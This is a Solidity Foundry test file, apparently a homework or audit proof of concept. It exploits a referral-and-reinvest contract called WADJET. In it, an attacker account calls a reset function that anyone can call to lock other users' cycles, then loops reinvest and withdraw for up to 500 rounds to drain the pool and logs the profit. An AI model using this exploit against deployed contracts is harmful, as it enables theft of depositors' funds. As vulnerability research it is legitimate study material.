pragma solidity ^0.8.20; // solhint-disable-line

import {Test, console} from "forge-std/Test.sol";
import {WADJET} from "../src/WADJET.sol";

contract attackTest is Test {

    WADJET internal wadjet;
    
    address internal deployer;
    address internal ceoAddress;
    address internal marketingAddress;
    address internal devAddress;
    address internal insuranceWallet;
    address internal communityWallet;
    address internal supportWallet;
    
    address internal Alice;
    address internal user1;
    address internal user2;
    address internal user3;
    address internal user4;
    address internal user5;
    address internal user6;
    address internal user7;
    address internal user8;
    address internal user9;

    function setUp() public {

        deployer = makeAddr("deployer");
        ceoAddress =  makeAddr("ceoAddress");
        marketingAddress = makeAddr("marketingAddress");
        devAddress = makeAddr("devAddress");
        insuranceWallet = makeAddr("insuranceWallet");
        communityWallet = makeAddr("communityWallet");
        supportWallet = makeAddr("supportWallet");
        
        // 攻击者部署 10 个地址
        Alice = makeAddr("Alice");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        user4 = makeAddr("user4");
        user5 = makeAddr("user5");
        user6 = makeAddr("user6");
        user7 = makeAddr("user7");
        user8 = makeAddr("user8");
        user9 = makeAddr("user9");




        vm.prank(deployer);
        wadjet = new WADJET(
            ceoAddress,
            marketingAddress,
            insuranceWallet,
            communityWallet,
            supportWallet   
        );

        vm.deal(Alice, 20 ether);
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.deal(user5, 10 ether);
        vm.deal(user6, 10 ether);
        vm.deal(user7, 10 ether);
        vm.deal(user8, 10 ether);
        vm.deal(user9, 10 ether);

    }

    function test_attack() public {
        uint256 alice_amount = 10 ether;
        uint256 user_amount = 0.2 ether;

        // uint256 fee = wadjet.devFee(alice_amount);  // 先不管,应该用不上
        
        vm.prank(Alice);
        wadjet.deposit{value: alice_amount}(deployer);  // Alice 存 10 ether, 推荐人为depolyer
        vm.prank(Alice);
        wadjet.reinvest();  // Alice 定投一次

        // 模拟时间过去 2 天， Alice保持定投
        // 其他用户开始投注
        // uint256 startTime = block.timestamp;
        // for (uint256 i = 1; i <= 2; i++){
        //     vm.warp(startTime + i * 1 days);
        //     vm.prank(Alice);
        //     wadjet.reinvest();
        // }

        // 模拟时间过去 1 天， Alice保持定投
        // 其他用户开始投注
        uint256 startTime = block.timestamp;
        vm.warp(startTime + 1 days);
        vm.prank(Alice);
        wadjet.reinvest();
        
        

        vm.prank(user1);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user1);
        wadjet.reinvest();

        vm.prank(user2);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user2);
        wadjet.reinvest();

        vm.prank(user3);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user3);
        wadjet.reinvest();

        vm.prank(user4);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user4);
        wadjet.reinvest();

        vm.prank(user5);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user5);
        wadjet.reinvest();

        vm.prank(user6);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user6);
        wadjet.reinvest();

        vm.prank(user7);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user7);
        wadjet.reinvest();

        vm.prank(user8);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user8);
        wadjet.reinvest();

        vm.prank(user9);
        wadjet.deposit{value: user_amount}(Alice);
        vm.prank(user9);
        wadjet.reinvest();
        
        // 查看 Alice 的盈利情况
        // uint256[] memory aliceData = wadjet.getContractData(Alice);
        // assertEq(aliceData[0], alice_amount);
        // assertEq(aliceData[4], 0.09 ether); // Alice 通过推荐用户获得的奖励
        // assertEq(aliceData[12], 10);    // 总共 10 个用户

        // 模拟时间过去 18 天，Alice 保持定投
        
        for (uint256 i = 2; i < 20; i++) {
            vm.warp(startTime + i * 1 days);
            // Alice 定投
            vm.prank(Alice);
            wadjet.reinvest();

            // 其他用户定投
            vm.prank(user1);
            wadjet.reinvest();
            vm.prank(user2);
            wadjet.reinvest();
            vm.prank(user3);
            wadjet.reinvest();
            vm.prank(user4);
            wadjet.reinvest();
            vm.prank(user5);
            wadjet.reinvest();
            vm.prank(user6);
            wadjet.reinvest();
            vm.prank(user7);
            wadjet.reinvest();
            vm.prank(user8);
            wadjet.reinvest();
            vm.prank(user9);
            wadjet.reinvest();
        }


        // 时间继续推进到第 20 天, Alice 开始提现
        vm.warp(startTime + 20 days);
        

        // 查询 Alice 定投了多少次 [调试用]
        vm.prank(Alice);
        uint256[] memory AliceDataForReinvest = wadjet.getContractData(Alice);
        console.log("Alice reinvest for: ", AliceDataForReinvest[8]);

        // 查询 user1 定投了多少次 [调试用]
        // vm.prank(user1);
        // uint256[] memory User_1_Data = wadjet.getContractData(user1);
        // console.log("User1 reinvest for: ", User_1_Data[8]);

        // 查询 user2 定投了多少次 [调试用]
        // vm.prank(user2);
        // uint256[] memory User_2_Data = wadjet.getContractData(user2);
        // console.log("User2 reinvest for: ", User_2_Data[8]);

        // 测试: 提款前执行一次定投,观察能够体现的数额是否更大

        // 提款前检查是否满足条件
        vm.prank(Alice);
        assertTrue(wadjet.canWithdraw(Alice));


        // 这里提前计算 Alice 的收益情况
        uint256[] memory AliceData = wadjet.getContractData(Alice);
        uint256 expectedProfit = AliceData[1];
        uint256 expectedNet = expectedProfit * 85 / 100;

        // 上限截断
        uint capLeft = AliceData[0] - AliceData[5];
        if(expectedNet > capLeft){
            expectedNet = capLeft;
        }

        // 提款前 Alice 的余额
        console.log("Balance of Alice before is: ", Alice.balance);
        // 提款前 池子的 余额
        console.log("Balance of Pool before is: ", wadjet.getBalance());


        // Alice 开始提款
        vm.prank(Alice);
        wadjet.withdraw();

        // 提款后 Alice 的余额
        console.log("Balance of Alice is: ", Alice.balance);
        // 提款后池子的余额
        uint256 poolBalance = wadjet.getBalance();
        console.log("Pool's balance is: ", poolBalance);

        // 重置其他用户的周期,reset 函数可被任何人调用
        vm.startPrank(Alice);
        wadjet.reset(user1);
        wadjet.reset(user2);
        wadjet.reset(user3);
        wadjet.reset(user4);
        wadjet.reset(user5);
        wadjet.reset(user6);
        wadjet.reset(user7);
        wadjet.reset(user8);
        wadjet.reset(user9);
        vm.stopPrank();

        // 检查 user1 的定投周期, 应该为 0 
        // User_1_Data = wadjet.getContractData(user1);
        // console.log("after reset user1 reinvest is: ", User_1_Data[8]);

        // Alice 进入第二轮: day0~day19 连续复投, day20 可提现
        uint256 secondCycleStart = startTime + 20 days;

        // day0 也必须复投, 否则 bit0 不会被置位
        vm.warp(secondCycleStart);
        vm.prank(Alice);
        wadjet.reinvest();

        for (uint256 i = 1; i < 20; i++) {
            vm.warp(secondCycleStart + i * 1 days);
            vm.prank(Alice);
            wadjet.reinvest();
        }

        vm.warp(secondCycleStart + 20 days);

        // 提款前检查是否满足条件
        vm.prank(Alice);
        assertTrue(wadjet.canWithdraw(Alice));
        
        
        // Alice 开始提款
        vm.prank(Alice);
        wadjet.withdraw();

        console.log("second Alice balance is: ", Alice.balance);
        console.log("second Pool balance is: ", wadjet.getBalance());

        // 至此,已经验证 Alice 攻击者可以锁住其他用户的 资金
        // 自己多轮复投,实现套利
        
        // 开始执行多轮套利
        uint256 maxRounds = 500;
        uint256 cycleStart = secondCycleStart + 20 days;
        uint256 firstRevertRound = 0;
        for(uint256 round = 0; round < maxRounds; round ++){

           
            vm.warp(cycleStart);
            vm.prank(Alice);
            wadjet.reinvest();
            
            

            for(uint256 i = 1; i < 20; i++){
                vm.warp(cycleStart + i * 1 days);
                vm.prank(Alice);
                wadjet.reinvest();
            }

            vm.warp(cycleStart + 20 days);

            vm.prank(Alice);
            bool canW = wadjet.canWithdraw(Alice);
            if (!canW) {
                break;
            }

            vm.prank(Alice);
            (bool ok, ) = address(wadjet).call(abi.encodeWithSignature("withdraw()"));
            if (!ok) {
                firstRevertRound = round + 1;
                break;
            }

            cycleStart = cycleStart + 20 days;
        }


        console.log("After more rounds: ");
        console.log("Balance of Alice final: ", Alice.balance);
        console.log("Balance of Pool final: ", wadjet.getBalance());
        console.log("loop rounds: ", firstRevertRound);        

    }



    function test_attack_multiRounds_untilRevert() public {
        uint256 aliceAmount = 10 ether;
        uint256 userAmount = 0.2 ether;
        uint256 initialAliceBalance = Alice.balance;

        vm.prank(Alice);
        wadjet.deposit{value: aliceAmount}(deployer);

        address[9] memory users = [user1, user2, user3, user4, user5, user6, user7, user8, user9];
        for (uint256 i = 0; i < users.length; i++) {
            vm.prank(users[i]);
            wadjet.deposit{value: userAmount}(Alice);
        }

        uint256 cycleStart = block.timestamp;
        uint256 firstRevertRound = 0;
        bool revertDetected = false;
        bool capReached = false;
        uint256 maxRounds = 500;
        uint256 completedRounds = 0;

        for (uint256 round = 1; round <= maxRounds; round++) {
            // 每轮 day0~day19 连续复投
            for (uint256 d = 0; d < 20; d++) {
                vm.warp(cycleStart + d * 1 days);
                vm.prank(Alice);
                wadjet.reinvest();
            }

            vm.warp(cycleStart + 20 days);

            vm.prank(Alice);
            bool canW = wadjet.canWithdraw(Alice);
            assertTrue(canW);

            uint256[] memory dataBefore = wadjet.getContractData(Alice);
            uint256 expectedProfit = dataBefore[1];
            uint256 expectedNet = expectedProfit * 85 / 100;
            uint256 capLeft = dataBefore[0] - dataBefore[5];
            if (expectedNet > capLeft) {
                expectedNet = capLeft;
            }

            if (expectedNet == 0) {
                capReached = true;
                break;
            }

            vm.prank(Alice);
            (bool ok, ) = address(wadjet).call(abi.encodeWithSignature("withdraw()"));
            if (!ok) {
                firstRevertRound = round;
                revertDetected = true;
                break;
            }

            completedRounds = round;
            cycleStart = cycleStart + 20 days;
        }

        uint256 finalAliceBalance = Alice.balance;
        uint256 balanceAfterDeposit = initialAliceBalance - aliceAmount;
        uint256 netVsInitial = finalAliceBalance > initialAliceBalance ? finalAliceBalance - initialAliceBalance : 0;
        uint256 netVsAfterDeposit = finalAliceBalance > balanceAfterDeposit ? finalAliceBalance - balanceAfterDeposit : 0;
        uint256[] memory finalAliceData = wadjet.getContractData(Alice);

        console.log("first revert round (0 means not reverted): ", firstRevertRound);
        console.log("cap reached before revert: ", capReached);
        console.log("completed withdraw rounds: ", completedRounds);
        console.log("Alice cumulative withdrawn: ", finalAliceData[5]);
        console.log("Alice net arbitrage vs initial balance: ", netVsInitial);
        console.log("Alice net inflow after own deposit: ", netVsAfterDeposit);
        console.log("Pool final balance: ", wadjet.getBalance());

        // 作业目标: 明确在给定轮数内是否出现终止条件; 若没出现也要给出量化结果
        assertTrue(revertDetected || capReached || completedRounds == maxRounds);
    }



}